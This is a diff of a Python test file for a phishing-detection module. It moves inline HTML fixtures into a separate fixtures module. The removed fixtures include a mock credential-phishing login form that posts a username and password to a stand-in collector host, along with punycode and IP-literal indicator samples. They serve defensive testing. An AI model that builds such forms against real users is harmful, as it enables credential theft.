@@ -5,43 +5,13 @@ those patterns, not live/hardcoded malicious URLs, so they stay stable.
 """
 from websec_agent import web_analysis as wa
 
-BENIGN_HTML = """
-<html><head><title>Example Domain</title></head>
-<body><p>This domain is for use in illustrative examples.</p></body></html>
-"""
-
-# Pattern observed on a real OpenPhish sample: brand name used verbatim as
-# the page title, served from an attacker-controlled subdomain of a free
-# PaaS host (vercel.app) that also contains the brand name in its own label.
-LOOKALIKE_SUBDOMAIN_HTML = """
-<html><head><title>WeTransfer</title>
-<link rel="icon" href="https://cdn.other-host.example/favicon.ico">
-</head>
-<body><p>Your file is ready. Please verify your account to download it.</p></body></html>
-"""
-
-# Classic credential-phishing kit: password field posting to a domain that
-# doesn't match the page it's embedded on, plus urgency language.
-CREDENTIAL_PHISH_HTML = """
-<html><head><title>PayPal - Secure Login</title></head>
-<body>
-<p>Your account has been suspended. Verify your account immediately.</p>
-<form action="https://collector.evil-example.net/save" method="post">
-  <input type="text" name="user">
-  <input type="password" name="pass">
-</form>
-</body></html>
-"""
-
-PUNYCODE_IOC_HTML = """
-<html><head><title>Login</title></head>
-<body><a href="https://xn--pypal-4ve.com/login">Continue</a></body></html>
-"""
-
-IP_LITERAL_IOC_HTML = """
-<html><head><title>Invoice</title></head>
-<body><img src="http://203.0.113.42/track.png"></body></html>
-"""
+from .fixtures import (
+    BENIGN_HTML,
+    CREDENTIAL_PHISH_HTML,
+    IP_LITERAL_IOC_HTML,
+    LOOKALIKE_SUBDOMAIN_HTML,
+    PUNYCODE_IOC_HTML,
+)
 
 
 def test_benign_page_scores_low():
